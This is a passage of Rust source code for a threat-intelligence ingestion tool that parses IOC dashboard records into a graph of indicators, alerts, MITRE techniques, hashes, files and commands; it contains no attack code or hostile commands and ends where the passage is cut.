use std::{
    collections::{HashMap, HashSet},
    fs,
    hash::{Hash, Hasher},
    net::IpAddr,
    path::{Path, PathBuf},
    sync::OnceLock,
};

use anyhow::{Context, Result};
use chrono::{DateTime, NaiveDateTime, TimeZone, Utc};
use regex::Regex;
use serde::Deserialize;
use serde_json::{json, Map, Value};
use tracing::warn;
use uuid::Uuid;

use crate::models::{Alert, GraphEdge, GraphNode, GraphSnapshot, IngestedFile, SourceObservation};

const NAMESPACE: Uuid = Uuid::from_u128(0x7f2f2b4ecb0a4a5cbf8f4d4d8bd1a120);

#[derive(Debug, Deserialize)]
struct DashboardRecord {
    id: Option<String>,
    #[serde(rename = "type")]
    ioc_type: Option<String>,
    value: Option<String>,
    severity: Option<String>,
    source: Option<String>,
    region: Option<String>,
    campaign: Option<String>,
    actor: Option<String>,
    tags: Option<Value>,
    description: Option<String>,
    #[serde(rename = "firstSeen")]
    first_seen: Option<String>,
    #[serde(rename = "lastSeen")]
    last_seen: Option<String>,
    #[serde(rename = "enrichedAt")]
    enriched_at: Option<String>,
    enrichment: Option<Value>,
    count: Option<i64>,
    raw: Option<Value>,
}

#[derive(Debug, Deserialize)]
struct IocShardManifest {
    version: u32,
    files: Vec<String>,
}

#[derive(Debug)]
struct NodeInput {
    node_type: String,
    value: String,
    label: String,
    severity: Option<String>,
    source: Option<String>,
    description: Option<String>,
    first_seen: DateTime<Utc>,
    last_seen: DateTime<Utc>,
    metadata: Value,
}

pub fn load_dashboard_snapshot(path: &Path) -> Result<GraphSnapshot> {
    let mut builder = SnapshotBuilder::default();

    if !path.exists() {
        warn!(dashboard_path = %path.display(), "dashboard path does not exist");
        return Ok(builder.finish());
    }

    let files = collect_json_files(path)?;
    let source_files = files
        .iter()
        .map(|file| source_file(path, file))
        .collect::<Result<Vec<_>>>()?;

    let mut observations = Vec::new();
    let mut observation_keys = HashSet::new();
    for (file, source_file) in files.into_iter().zip(&source_files) {
        let value = read_json_file(&file)
            .with_context(|| format!("failed to read dashboard json {}", file.display()))?;

        let Value::Array(items) = value else {
            continue;
        };

        for item in items {
            let Some(observation) = source_observation(&source_file.path, &item) else {
                warn!(file = %file.display(), "skipping non-object dashboard record");
                continue;
            };
            let key = (
                observation.source_file_path.clone(),
                observation.source_record_id.clone(),
            );
            if !observation_keys.insert(key) {
                anyhow::bail!(
                    "duplicate dashboard record id {} in {}",
                    observation.source_record_id,
                    file.display()
                );
            }
            observations.push(observation);

            match serde_json::from_value::<DashboardRecord>(item) {
                Ok(record) => builder.add_record(record),
                Err(error) => warn!(
                    error = %error,
                    file = %file.display(),
                    "skipping invalid dashboard record"
                ),
            }
        }
    }

    let mut snapshot = builder.finish();
    snapshot.source_files = source_files;
    snapshot.observations = observations;
    Ok(snapshot)
}

#[derive(Default)]
struct SnapshotBuilder {
    nodes: HashMap<String, GraphNode>,
    alerts: HashMap<String, Alert>,
    edges: HashMap<String, GraphEdge>,
    contexts: HashMap<String, ParsedContext>,
}

impl SnapshotBuilder {
    fn finish(self) -> GraphSnapshot {
        let mut nodes: Vec<_> = self.nodes.into_values().collect();
        nodes.sort_by(|left, right| {
            left.node_type
                .cmp(&right.node_type)
                .then_with(|| left.value.cmp(&right.value))
        });

        let mut alerts: Vec<_> = self.alerts.into_values().collect();
        alerts.sort_by(|left, right| {
            right
                .last_seen
                .cmp(&left.last_seen)
                .then_with(|| left.source.cmp(&right.source))
                .then_with(|| left.external_id.cmp(&right.external_id))
        });

        let mut edges: Vec<_> = self.edges.into_values().collect();
        edges.sort_by(|left, right| {
            left.relation
                .cmp(&right.relation)
                .then_with(|| left.source_node_id.cmp(&right.source_node_id))
                .then_with(|| left.target_node_id.cmp(&right.target_node_id))
        });

        let fingerprint = snapshot_fingerprint(&nodes, &edges, &alerts);

        GraphSnapshot {
            nodes,
            edges,
            alerts,
            fingerprint,
            source_files: Vec::new(),
            observations: Vec::new(),
        }
    }

    fn add_record(&mut self, record: DashboardRecord) {
        let Some((node_type, value)) = normalize_ioc(
            record.ioc_type.as_deref().unwrap_or(""),
            record.value.as_deref().unwrap_or(""),
        ) else {
            return;
        };

        let context_key = record_context_key(&record, &node_type, &value);
        let context = self.context_for(context_key, &record);
        let now = Utc::now();
        let first_seen = parse_datetime(record.first_seen.as_deref())
            .or(context.first_seen)
            .unwrap_or(now);
        let mut last_seen = parse_datetime(record.last_seen.as_deref())
            .or(context.last_seen)
            .unwrap_or(first_seen);
        if last_seen < first_seen {
            last_seen = first_seen;
        }

        let severity =
            normalize_severity(record.severity.as_deref().or(context.severity.as_deref()));
        let source = record
            .source
            .clone()
            .filter(|value| !value.trim().is_empty())
            .unwrap_or_else(|| "dashboard".to_string());
        let region = record_region(&record);
        let tags = tags_from_value(record.tags.as_ref());
        let label = value.clone();
        let description = record
            .description
            .clone()
            .map(|value| truncate(&value, 2000));

        let ioc_id = self.add_node(NodeInput {
            node_type: node_type.clone(),
            value: value.clone(),
            label,
            severity: severity.clone(),
            source: Some(source.clone()),
            description: description.clone(),
            first_seen,
            last_seen,
            metadata: compact_record_metadata(&record, &tags),
        });

        let (alert_id, alert_node_id) = self.add_alert(
            &record,
            &context,
            &source,
            severity.clone(),
            first_seen,
            last_seen,
        );
        self.add_edge(
            ioc_id,
            alert_node_id,
            "seen_in",
            Some(alert_id),
            first_seen,
            last_seen,
        );

        let source_id = self.add_node(NodeInput {
            node_type: "Source".to_string(),
            value: source.clone(),
            label: region.clone().unwrap_or_else(|| source.clone()),
            severity: None,
            source: Some(source.clone()),
            description: None,
            first_seen,
            last_seen,
            metadata: source_metadata(region.as_deref()),
        });
        self.add_edge(
            ioc_id,
            source_id,
            "seen_in",
            Some(alert_id),
            first_seen,
            last_seen,
        );
        self.add_edge(
            source_id,
            alert_node_id,
            "seen_in",
            Some(alert_id),
            first_seen,
            last_seen,
        );

        let context_ip_id = self.add_context_ip(
            &node_type,
            &value,
            &context,
            severity.clone(),
            &source,
            first_seen,
            last_seen,
        );

        if let Some(ip_id) = context_ip_id {
            self.add_edge(
                ip_id,
                alert_node_id,
                "seen_in",
                Some(alert_id),
                first_seen,
                last_seen,
            );
            if ip_id != ioc_id {
                self.add_edge(
                    ioc_id,
                    ip_id,
                    "related_to",
                    Some(alert_id),
                    first_seen,
                    last_seen,
                );
            }

            self.add_geo_edges(ip_id, &context, first_seen, last_seen);
        } else {
            self.add_geo_edges(ioc_id, &context, first_seen, last_seen);
        }

        let domain_id = self
            .add_url_domain_edges(
                &node_type,
                &value,
                severity.clone(),
                &source,
                first_seen,
                last_seen,
            )
            .or_else(|| (node_type == "Domain").then_some(ioc_id));
        if let (Some(domain_id), Some(ip_id)) = (domain_id, context_ip_id) {
            self.add_edge(domain_id, ip_id, "resolves_to", None, first_seen, last_seen);
        }
        self.add_context_domain_edges(
            domain_id,
            context_ip_id,
            alert_node_id,
            &context,
            severity.clone(),
            &source,
            first_seen,
            last_seen,
        );

        self.add_mitre_edges(ioc_id, alert_node_id, &context, first_seen, last_seen);
        let hash_ids = self.add_hash_edges(
            ioc_id,
            context_ip_id,
            alert_node_id,
            &context,
            &source,
            first_seen,
            last_seen,
        );
        let file_ids = self.add_file_edges(
            context_ip_id,
            alert_node_id,
            &context,
            &source,
            first_seen,
            last_seen,
        );
        for hash_id in &hash_ids {
            for file_id in &file_ids {
                self.add_edge(
                    *hash_id,
                    *file_id,
                    "related_to",
                    None,
                    first_seen,
                    last_seen,
                );
            }
        }
        if node_type == "Hash" {
            for file_id in file_ids {
                self.add_edge(ioc_id, file_id, "related_to", None, first_seen, last_seen);
            }
        }
        if node_type == "File" {
            for hash_id in hash_ids {
                self.add_edge(hash_id, ioc_id, "related_to", None, first_seen, last_seen);
            }
        }
        self.add_command_edges(
            ioc_id,
            context_ip_id,
            alert_node_id,
            &context,
            &source,
            first_seen,
            last_seen,
        );
        self.add_malware_edges(ioc_id, record.enrichment.as_ref(), first_seen, last_seen);
    }

    fn context_for(&mut self, key: String, record: &DashboardRecord) -> ParsedContext {
        if let Some(context) = self.contexts.get(&key) {
            return context.clone();
        }

        let context = ParsedContext::from_record(record);
        self.contexts.insert(key, context.clone());
        context
    }

    fn add_alert(
        &mut self,
        record: &DashboardRecord,
        context: &ParsedContext,
        source: &str,
        severity: Option<String>,
        first_seen: DateTime<Utc>,
        last_seen: DateTime<Utc>,
    ) -> (Uuid, Uuid) {
        let source = clean_text(source.to_string());
        let fallback_seed = format!(
            "{}:{}:{}:{}",
            source,
            record.ioc_type.as_deref().unwrap_or("ioc"),
            record.value.as_deref().unwrap_or("unknown"),
            first_seen.timestamp_millis()
        );
        let external_id = raw_id(record)
            .or_else(|| record.id.clone())
            .unwrap_or_else(|| stable_id("alert-external", &fallback_seed).to_string());
        let external_id = clean_text(external_id);
        let title = context.title.clone().unwrap_or_else(|| {
            format!(
                "{} {}",
                record.ioc_type.as_deref().unwrap_or("IOC"),
                record.value.as_deref().unwrap_or("unknown")
            )
        });
        let title = clean_text(title);
        let alert_value = format!("{source}:{external_id}");
        let alert_node_id = self.add_node(NodeInput {
            node_type: "Alert".to_string(),
            value: alert_value.clone(),
            label: truncate(&title, 120),
            severity: severity.clone(),
            source: Some(source.clone()),
            description: Some(context.alert_description.clone()),
            first_seen,
            last_seen,
            metadata: alert_metadata(&external_id, record_region(record).as_deref()),
        });

        let id = stable_id("alert", &alert_value);
        let raw = if self
            .alerts
            .contains_key(&format!("{source}\u{1f}{external_id}"))
        {
            json!({})
        } else {
            record.raw.clone().unwrap_or_else(|| json!({}))
        };
        let raw = sanitize_json_value(raw);
        let alert = Alert {
            id,
            node_id: alert_node_id,
            external_id: external_id.clone(),
            title: truncate(&title, 180),
            severity,
            source: source.clone(),
            description: Some(context.alert_description.clone()),
            first_seen,
            last_seen,
            raw,
        };

        let key = format!("{source}\u{1f}{external_id}");
        self.alerts
            .entry(key)
            .and_modify(|existing| merge_alert(existing, &alert))
            .or_insert(alert);

        (id, alert_node_id)
    }

    fn add_context_ip(
        &mut self,
        node_type: &str,
        value: &str,
        context: &ParsedContext,
        severity: Option<String>,
        source: &str,
        first_seen: DateTime<Utc>,
        last_seen: DateTime<Utc>,
    ) -> Option<Uuid> {
        let ip = context.source_ip.clone().or_else(|| {
            if node_type == "IP" {
                Some(value.to_string())
            } else {
                None
            }
        })?;
        let ip = normalize_ip(&ip)?;

        Some(self.add_node(NodeInput {
            node_type: "IP".to_string(),
            value: ip.clone(),
            label: ip,
            severity,
            source: Some(source.to_string()),
            description: Some(context.node_description.clone()),
            first_seen,
            last_seen,
            metadata: json!({ "role": "source_ip" }),
        }))
    }

    fn add_geo_edges(
        &mut self,
        subject_id: Uuid,
        context: &ParsedContext,
        first_seen: DateTime<Utc>,
        last_seen: DateTime<Utc>,
    ) {
        let (country, asn, org) = (&context.country, &context.asn, &context.org);

        if let Some(country) = country.clone() {
            let country_id = self.add_node(NodeInput {
                node_type: "Country".to_string(),
                value: country.clone(),
                label: country,
                severity: None,
                source: None,
                description: None,
                first_seen,
                last_seen,
                metadata: json!({}),
            });
            self.add_edge(
                subject_id,
                country_id,
                "belongs_to",
                None,
                first_seen,
                last_seen,
            );
        }

        if let Some(asn) = asn.clone() {
            let label = org
                .as_ref()
                .filter(|value| !value.is_empty())
                .map(|value| format!("{asn} {value}"))
                .unwrap_or_else(|| asn.clone());
            let asn_id = self.add_node(NodeInput {
                node_type: "ASN".to_string(),
                value: asn,
                label,
                severity: None,
                source: None,
                description: org.clone(),
                first_seen,
                last_seen,
                metadata: json!({ "org": org }),
            });
            self.add_edge(
                subject_id,
                asn_id,
                "belongs_to",
                None,
                first_seen,
                last_seen,
            );
        }
    }

    fn add_url_domain_edges(
        &mut self,
        node_type: &str,
        value: &str,
        severity: Option<String>,
        source: &str,
        first_seen: DateTime<Utc>,
        last_seen: DateTime<Utc>,
    ) -> Option<Uuid> {
        if node_type != "URL" {
            return None;
        }
        let Some(host) = host_from_url(value) else {
            return None;
        };
        let url_id = stable_id("node", &node_key("URL", value));
        let domain_id = self.add_node(NodeInput {
            node_type: "Domain".to_string(),
            value: host.clone(),
            label: host,
            severity,
            source: Some(source.to_string()),
            description: None,
            first_seen,
            last_seen,
            metadata: json!({ "derived_from": "url" }),
        });
        self.add_edge(domain_id, url_id, "hosts", None, first_seen, last_seen);
        Some(domain_id)
    }

    #[allow(clippy::too_many_arguments)]
    fn add_context_domain_edges(
        &mut self,
        existing_domain_id: Option<Uuid>,
        context_ip_id: Option<Uuid>,
        alert_node_id: Uuid,
        context: &ParsedContext,
        severity: Option<String>,
        source: &str,
        first_seen: DateTime<Utc>,
        last_seen: DateTime<Utc>,
    ) {
        for domain in &context.domains {
            let domain_id = self.add_node(NodeInput {
                node_type: "Domain".to_string(),
                value: domain.clone(),
                label: domain.clone(),
                severity: severity.clone(),
                source: Some(source.to_string()),
                description: Some(context.node_description.clone()),
                first_seen,
                last_seen,
                metadata: json!({ "derived_from": "alert_context" }),
            });
            self.add_edge(
                domain_id,
                alert_node_id,
                "seen_in",
                None,
                first_seen,
                last_seen,
            );
            if let Some(ip_id) = context_ip_id {
                self.add_edge(domain_id, ip_id, "resolves_to", None, first_seen, last_seen);
            }
            if let Some(existing_domain_id) = existing_domain_id {
                if existing_domain_id != domain_id {
                    self.add_edge(
                        existing_domain_id,
                        domain_id,
                        "related_to",
                        None,
                        first_seen,
                        last_seen,
                    );
                }
            }
        }
    }

    fn add_mitre_edges(
        &mut self,
        ioc_id: Uuid,
        alert_node_id: Uuid,
        context: &ParsedContext,
        first_seen: DateTime<Utc>,
        last_seen: DateTime<Utc>,
    ) {
        for (code, label) in &context.mitre {
            let mitre_id = self.add_node(NodeInput {
                node_type: "MITRE Technique".to_string(),
                value: code.clone(),
                label: if label.is_empty() {
                    code.clone()
                } else {
                    format!("{code} {label}")
                },
                severity: None,
                source: None,
                description: None,
                first_seen,
                last_seen,
                metadata: json!({ "technique": label }),
            });
            self.add_edge(
                alert_node_id,
                mitre_id,
                "mapped_to",
                None,
                first_seen,
                last_seen,
            );
            self.add_edge(ioc_id, mitre_id, "mapped_to", None, first_seen, last_seen);
        }
    }

    fn add_hash_edges(
        &mut self,
        ioc_id: Uuid,
        context_ip_id: Option<Uuid>,
        alert_node_id: Uuid,
        context: &ParsedContext,
        source: &str,
        first_seen: DateTime<Utc>,
        last_seen: DateTime<Utc>,
    ) -> Vec<Uuid> {
        let mut hash_ids = Vec::new();
        for hash in &context.hashes {
            let hash_id = self.add_node(NodeInput {
                node_type: "Hash".to_string(),
                value: hash.clone(),
                label: short_hash(&hash),
                severity: None,
                source: Some(source.to_string()),
                description: None,
                first_seen,
                last_seen,
                metadata: json!({}),
            });
            self.add_edge(
                hash_id,
                alert_node_id,
                "seen_in",
                None,
                first_seen,
                last_seen,
            );
            if hash_id != ioc_id {
                self.add_edge(ioc_id, hash_id, "related_to", None, first_seen, last_seen);
            }
            if let Some(ip_id) = context_ip_id {
                self.add_edge(
                    hash_id,
                    ip_id,
                    "downloaded_from",
                    None,
                    first_seen,
                    last_seen,
                );
            }
            hash_ids.push(hash_id);
        }
        hash_ids
    }

    fn add_file_edges(
        &mut self,
        context_ip_id: Option<Uuid>,
        alert_node_id: Uuid,
        context: &ParsedContext,
        source: &str,
        first_seen: DateTime<Utc>,
        last_seen: DateTime<Utc>,
    ) -> Vec<Uuid> {
        let mut file_ids = Vec::new();
        for file in &context.files {
            let file_id = self.add_node(NodeInput {
                node_type: "File".to_string(),
                value: file.clone(),
                label: truncate(&file, 80),
                severity: None,
                source: Some(source.to_string()),
                description: None,
                first_seen,
                last_seen,
                metadata: json!({}),
            });
            self.add_edge(
                file_id,
                alert_node_id,
                "seen_in",
                None,
                first_seen,
                last_seen,
            );
            if let Some(ip_id) = context_ip_id {
                self.add_edge(
                    file_id,
                    ip_id,
                    "downloaded_from",
                    None,
                    first_seen,
                    last_seen,
                );
            }
            file_ids.push(file_id);
        }
        file_ids
    }

    fn add_command_edges(
        &mut self,
        ioc_id: Uuid,
        context_ip_id: Option<Uuid>,
        alert_node_id: Uuid,
        context: &ParsedContext,
        source: &str,
        first_seen: DateTime<Utc>,
        last_seen: DateTime<Utc>,
    ) -> Vec<Uuid> {
        let mut command_ids = Vec::new();
        for command in &context.commands {
            let command_id = self.add_node(NodeInput {
                node_type: "Command".to_string(),
                value: command.clone(),
                label: truncate(command, 96),
                severity: None,
                source: Some(source.to_string()),
                description: Some(command.clone()),
                first_seen,
                last_seen,
                metadata: json!({ "kind": "shell_command" }),
            });
            self.add_edge(
                command_id,
                alert_node_id,
                "seen_in",
                None,
                first_seen,
                last_seen,
            );
            self.add_edge(
                ioc_id,
                command_id,
                "related_to",
                None,
                first_seen,
                last_seen,
            );
            if let Some(ip_id) = context_ip_id {
                self.add_edge(command_id, ip_id, "related_to", None, first_seen, last_seen);
            }
            command_ids.push(command_id);
        }
        command_ids
    }

    fn add_malware_edges(
        &mut self,
        ioc_id: Uuid,
        enrichment: Option<&Value>,
        first_seen: DateTime<Utc>,
        last_seen: DateTime<Utc>,
    ) {
        for label in malware_labels(enrichment) {
            let malware_id = self.add_node(NodeInput {
                node_type: "Malware".to_string(),
                value: label.clone(),
                label,
                severity: Some("high".to_string()),
                source: None,
                description: None,
                first_seen,
                last_seen,
                metadata: json!({ "derived_from": "enrichment" }),
            });
            self.add_edge(
                ioc_id,
                malware_id,
                "detected_as",
                None,
                first_seen,
                last_seen,
            );
        }
    }

    fn add_node(&mut self, input: NodeInput) -> Uuid {
        let node_type = clean_text(input.node_type);
        let value = clean_text(input.value);
        let key = node_key(&node_type, &value);
        let id = stable_id("node", &key);
        let node = GraphNode {
            id,
            node_type,
            value,
            label: clean_text(input.label),
            severity: input.severity.map(clean_text),
            source: input.source.map(clean_text),
            description: input.description.map(clean_text),
            first_seen: input.first_seen,
            last_seen: input.last_seen,
            metadata: sanitize_json_value(input.metadata),
        };

        self.nodes
            .entry(key)
            .and_modify(|existing| merge_node(existing, &node))
            .or_insert(node);
        id
    }

    fn add_edge(
        &mut self,
        source_node_id: Uuid,
        target_node_id: Uuid,
        relation: &str,
        alert_id: Option<Uuid>,
        first_seen: DateTime<Utc>,
        last_seen: DateTime<Utc>,
    ) {
        if source_node_id == target_node_id {
            return;
        }
        let key = format!("{source_node_id}\u{1f}{target_node_id}\u{1f}{relation}");
        let edge = GraphEdge {
            id: stable_id("edge", &key),
            source_node_id,
            target_node_id,
            relation: relation.to_string(),
            alert_id,
            first_seen,
            last_seen,
            metadata: json!({ "count": 1 }),
        };

        self.edges
            .entry(key)
            .and_modify(|existing| merge_edge(existing, &edge))
            .or_insert(edge);
    }
}

fn source_observation(source_file_path: &str, payload: &Value) -> Option<SourceObservation> {
    let Value::Object(object) = payload else {
        return None;
    };
    let source_record_id = object
        .get("id")
        .and_then(Value::as_str)
        .map(str::trim)
        .filter(|id| !id.is_empty())
        .map(str::to_owned)
        .unwrap_or_default();
    let payload = sanitize_json_value(payload.clone());
    let content_fingerprint = value_fingerprint(&payload);
    let source_record_id = if source_record_id.is_empty() {
        format!("anonymous:{content_fingerprint}")
    } else {
        source_record_id
    };

    Some(SourceObservation {
        source_file_path: source_file_path.to_owned(),
        source_record_id,
        content_fingerprint,
        payload,
    })
}

fn value_fingerprint(value: &Value) -> String {
    let mut hasher = std::collections::hash_map::DefaultHasher::new();
    value.to_string().hash(&mut hasher);
    format!("{:016x}", hasher.finish())
}

#[derive(Clone, Debug)]
struct ParsedContext {
    title: Option<String>,
    severity: Option<String>,
    first_seen: Option<DateTime<Utc>>,
    last_seen: Option<DateTime<Utc>>,
    source_ip: Option<String>,
    country: Option<String>,
    asn: Option<String>,
    org: Option<String>,
    mitre: Vec<(String, String)>,
    hashes: Vec<String>,
    files: Vec<String>,
    commands: Vec<String>,
    domains: Vec<String>,
    node_description: String,
    alert_description: String,
}

impl ParsedContext {
    fn from_record(record: &DashboardRecord) -> Self {
        let text = record_text(record);
        let (country, asn, org) = parse_country_asn(&text);

        Self {
            title: title_from_text(&text),
            severity: severity_from_text(&text),
            first_seen: parse_alert_datetime(&text, "First Seen"),
            last_seen: parse_alert_datetime(&text, "Last Seen"),
            source_ip: parse_field(&text, "Source IP").and_then(|value| normalize_ip(&value)),
            country,
            asn,
            org,
            mitre: parse_mitre(&text),
            hashes: parse_hashes(&text),
            files: parse_downloaded_files(&text),
            commands: parse_commands(&text),
            domains: parse_domains(&text),
            node_description: truncate(&text, 1200),
            alert_description: truncate(&text, 4000),
        }
    }
}

fn record_context_key(record: &DashboardRecord, node_type: &str, value: &str) -> String {
    raw_id(record)
        .or_else(|| record.id.clone())
        .unwrap_or_else(|| {
            [
                record.source.as_deref().unwrap_or("dashboard"),
                node_type,
                value,
                record.first_seen.as_deref().unwrap_or(""),
            ]
            .join("|")
        })
}

fn snapshot_fingerprint(nodes: &[GraphNode], edges: &[GraphEdge], alerts: &[Alert]) -> String {
    let mut hasher = std::collections::hash_map::DefaultHasher::new();

    for node in nodes {
        node.id.hash(&mut hasher);
        node.node_type.hash(&mut hasher);
        node.value.hash(&mut hasher);
        node.label.hash(&mut hasher);
        node.severity.hash(&mut hasher);
        node.source.hash(&mut hasher);
        node.first_seen.timestamp_millis().hash(&mut hasher);
        node.last_seen.timestamp_millis().hash(&mut hasher);
    }

    for edge in edges {
        edge.id.hash(&mut hasher);
        edge.source_node_id.hash(&mut hasher);
        edge.target_node_id.hash(&mut hasher);
        edge.relation.hash(&mut hasher);
        edge.alert_id.hash(&mut hasher);
        edge.first_seen.timestamp_millis().hash(&mut hasher);
        edge.last_seen.timestamp_millis().hash(&mut hasher);
    }

    for alert in alerts {
        alert.id.hash(&mut hasher);
        alert.node_id.hash(&mut hasher);
        alert.external_id.hash(&mut hasher);
        alert.title.hash(&mut hasher);
        alert.severity.hash(&mut hasher);
        alert.source.hash(&mut hasher);
        alert.first_seen.timestamp_millis().hash(&mut hasher);
        alert.last_seen.timestamp_millis().hash(&mut hasher);
    }

    format!("{:016x}", hasher.finish())
}

fn collect_json_files(root: &Path) -> Result<Vec<PathBuf>> {
    let manifest_path = root.join("data/iocs-manifest.json");
    if manifest_path.is_file() {
        return collect_manifest_files(root, &manifest_path);
    }

    let mut files = Vec::new();
    collect_json_files_inner(root, &mut files)?;
    files.sort();
    Ok(files)
}

fn collect_manifest_files(root: &Path, manifest_path: &Path) -> Result<Vec<PathBuf>> {
    let manifest: IocShardManifest = serde_json::from_str(&fs::read_to_string(manifest_path)?)
        .with_context(|| {
            format!(
                "failed to read IOC shard manifest {}",
                manifest_path.display()
            )
        })?;
    if manifest.version != 1 {
        anyhow::bail!(
            "unsupported IOC shard manifest version {}",
            manifest.version
        );
    }

    let data_dir = root.join("data");
    let mut seen = HashSet::new();
    let mut files = Vec::with_capacity(manifest.files.len());
    for file in manifest.files {
        if !is_safe_ioc_shard_name(&file) || !seen.insert(file.clone()) {
            anyhow::bail!("invalid IOC shard name in manifest");
        }
        let path = data_dir.join(file);
        if !path.is_file() {
            anyhow::bail!(
                "IOC shard listed in manifest is missing: {}",
                path.display()
            );
        }
        files.push(path);
    }
    Ok(files)
}

fn is_safe_ioc_shard_name(file: &str) -> bool {
    let Some(sequence) = file
        .strip_prefix("iocs-")
        .and_then(|name| name.strip_suffix(".json"))
    else {
        return false;
    };
    let Some((generation, index)) = sequence.rsplit_once('-') else {
        return false;
    };
    !generation.is_empty()
        && generation
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || byte == b'-')
        && index.len() == 6
        && index.bytes().all(|byte| byte.is_ascii_digit())
}

fn collect_json_files_inner(path: &Path, files: &mut Vec<PathBuf>) -> Result<()> {
    if path.is_file() {
        if path.extension().and_then(|value| value.to_str()) == Some("json") {
            files.push(path.to_path_buf());
        }
        return Ok(());
    }

    for entry in fs::read_dir(path)? {
        let entry = entry?;
        collect_json_files_inner(&entry.path(), files)?;
    }

    Ok(())
}

fn read_json_file(path: &Path) -> Result<Value> {
    let raw = fs::read_to_string(path)?;
    match serde_json::from_str::<Value>(&raw) {
        Ok(value) => Ok(value),
        Err(first_error) => {
            let sanitized = sanitize_lone_surrogate_escapes(&raw);
            serde_json::from_str::<Value>(&sanitized)
                .with_context(|| format!("json parse failed before sanitizing: {first_error}"))
        }
    }
}

fn source_file(root: &Path, path: &Path) -> Result<IngestedFile> {
    let raw = fs::read(path)?;
    let mut hasher = std::collections::hash_map::DefaultHasher::new();
    raw.hash(&mut hasher);
    Ok(IngestedFile {
        path: path
            .strip_prefix(root)
            .unwrap_or(path)
            .to_string_lossy()
            .replace('\\', "/"),
        fingerprint: format!("{:016x}", hasher.finish()),
        size_bytes: i64::try_from(raw.len()).unwrap_or(i64::MAX),
    })
}

fn sanitize_lone_surrogate_escapes(input: &str) -> String {
    let mut output = String::with_capacity(input.len());
    let bytes = input.as_bytes();
    let mut index = 0;

    while index < bytes.len() {
        if index + 6 <= bytes.len()
            && bytes[index] == b'\\'
            && bytes[index + 1] == b'u'
            && hex4(&bytes[index + 2..index + 6]).is_some()
        {
            let code = hex4(&bytes[index + 2..index + 6]).unwrap();
            if is_high_surrogate(code) {
                if index + 12 <= bytes.len()
                    && bytes[index + 6] == b'\\'
                    && bytes[index + 7] == b'u'
                    && hex4(&bytes[index + 8..index + 12]).is_some_and(is_low_surrogate)
                {
                    output.push_str(&input[index..index + 12]);
                    index += 12;
                } else {
                    output.push_str("\\uFFFD");
                    index += 6;
                }
                continue;
            }

            if is_low_surrogate(code) {
                output.push_str("\\uFFFD");
                index += 6;
                continue;
            }
        }

        let ch = input[index..].chars().next().unwrap();
        output.push(ch);
        index += ch.len_utf8();
    }

    output
}

fn hex4(bytes: &[u8]) -> Option<u16> {
    if bytes.len() != 4 {
        return None;
    }
    let text = std::str::from_utf8(bytes).ok()?;
    u16::from_str_radix(text, 16).ok()
}

fn is_high_surrogate(code: u16) -> bool {
    (0xD800..=0xDBFF).contains(&code)
}

fn is_low_surrogate(code: u16) -> bool {
    (0xDC00..=0xDFFF).contains(&code)
}

fn normalize_ioc(raw_type: &str, raw_value: &str) -> Option<(String, String)> {
    let value = raw_value.trim().trim_end_matches([',', '.', ';', ')', ']']);
    if value.is_empty() {
        return None;
    }

    let raw_type = raw_type.trim().to_ascii_lowercase();
    if raw_type == "file" || raw_type == "filename" {
        return classify_file_typed_value(value);
    }

    let node_type = match raw_type.trim().to_ascii_lowercase().as_str() {
        "ip" | "ipv4" | "ipv6" => "IP",
        "domain" => "Domain",
        "url" => "URL",
        "hash" | "sha256" | "sha1" | "md5" => "Hash",
        "email" => "Email",
        "cve" => "CVE",
        "command" | "cmd" => "Command",
        "malware" => "Malware",
        "asn" => "ASN",
        "country" => "Country",
        "source" => "Source",
        _ => return None,
    };

    if node_type == "Email" && !email_re().is_match(value) {
        return None;
    }
    if node_type == "CVE" && !cve_re().is_match(value) {
        return None;
    }

    let normalized = match node_type {
        "Domain" | "Hash" | "Email" => value.to_ascii_lowercase(),
        "CVE" => value.to_ascii_uppercase(),
        "URL" => value.to_string(),
        _ => value.to_string(),
    };

    Some((node_type.to_string(), normalized))
}

fn normalize_ip(value: &str) -> Option<String> {
    value
        .trim()
        .trim_matches(['[', ']', '(', ')', ',', ';'])
        .parse::<IpAddr>()
        .ok()
        .map(|ip| ip.to_string())
}

fn classify_file_typed_value(value: &str) -> Option<(String, String)> {
    let candidate = field_value(value);

    if let Some(ip) = normalize_ip(&candidate) {
        return Some(("IP".to_string(), ip));
    }

    if is_hash_value(&candidate) {
        return Some(("Hash".to_string(), candidate.to_ascii_lowercase()));
    }

    if host_from_url(&candidate).is_some() {
        return Some(("URL".to_string(), candidate));
    }

    if is_likely_command(&candidate) {
        return Some(("Command".to_string(), candidate));
    }

    if let Some(file) = normalize_downloaded_file(&candidate) {
        return Some(("File".to_string(), file));
    }

    if is_domain_value(&candidate) {
        return Some(("Domain".to_string(), candidate.to_ascii_lowercase()));
    }

    None
}

fn field_value(value: &str) -> String {
    let value = strip_bullet(value);
    let Some((label, rest)) = value.split_once(':') else {
        return value;
    };

    if is_non_file_field_label(label) {
        rest.trim().to_string()
    } else {
        value
    }
}

fn normalize_downloaded_file(value: &str) -> Option<String> {
    let value = field_value(value);
    if !is_observed_value(&value) || is_hash_value(&value) || normalize_ip(&value).is_some() {
        return None;
    }

    if let Some(file) = downloaded_file_from_url(&value) {
        return Some(file);
    }

    is_valid_file_candidate(&value).then_some(value)
}

fn downloaded_file_from_url(value: &str) -> Option<String> {
    host_from_url(value)?;
    let path = value.split(['?', '#']).next().unwrap_or(value);
    let file = path.rsplit('/').next().unwrap_or("").trim();
    is_valid_file_candidate(file).then(|| file.to_string())
}

fn is_valid_file_candidate(value: &str) -> bool {
    let value = value.trim();
    if !is_observed_value(value)
        || is_hash_value(value)
        || normalize_ip(value).is_some()
        || is_likely_command(value)
        || value.contains(':')
        || value.contains(' ')
        || value.contains('(')
        || value.contains(')')
        || value.len() > 260
    {
        return false;
    }

    if section_header_names()
        .iter()
        .any(|header| value.eq_ignore_ascii_case(header))
    {
        return false;
    }

    let lower = value.to_ascii_lowercase();
    let has_path_separator = value.contains('/') || value.contains('\\');
    let known_file_extension = [
        ".sh", ".bash", ".bin", ".elf", ".exe", ".dll", ".so", ".py", ".pl", ".jar", ".apk",
        ".zip", ".tar", ".gz", ".xz", ".7z", ".rar", ".deb", ".rpm", ".ps1", ".bat", ".cmd",
        ".x86", ".x86_64", ".i686", ".arm", ".arm7", ".mips", ".mpsl", ".ppc", ".sparc",
    ]
    .iter()
    .any(|suffix| lower.ends_with(suffix));

    has_path_separator || known_file_extension
}

fn is_observed_value(value: &str) -> bool {
    let value = value.trim();
    !value.is_empty()
        && !value.eq_ignore_ascii_case("none")
        && !value.eq_ignore_ascii_case("none observed")
